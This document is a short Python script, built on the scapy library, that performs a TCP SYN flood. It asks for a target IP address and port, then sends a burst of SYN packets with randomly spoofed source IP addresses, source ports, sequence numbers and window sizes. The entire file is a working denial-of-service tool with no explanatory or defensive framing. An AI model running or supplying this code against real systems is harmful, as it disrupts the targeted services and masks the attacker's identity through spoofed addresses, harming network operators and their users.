from scapy.all import *
import random

def SYN_Flood(ip_target, port_target):
    for i in range(0,100):
        src_port = random.randint((2**10)+1,2**16)
        src_seq = random.randint(0,2**32)
        win_size = random.randint(0,2**16)
        src_IP = str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))
        
        IP_PKT = IP()
        IP_PKT.src = src_IP
        IP_PKT.dst = ip_target

        TCP_PKT = TCP()
        TCP_PKT.sport = src_port
        TCP_PKT.dport = int(port_target)
        TCP_PKT.flags = "S"
        TCP_PKT.seq = src_seq
        TCP_PKT.window = win_size

        send(IP_PKT/TCP_PKT, verbose=0)
    print("All the packets has been sent")

def main():
    ip_target = input("Target IP: ")
    port_target = input("Target port: ")
    SYN_Flood(ip_target, port_target)

if __name__ == "__main__":
    main()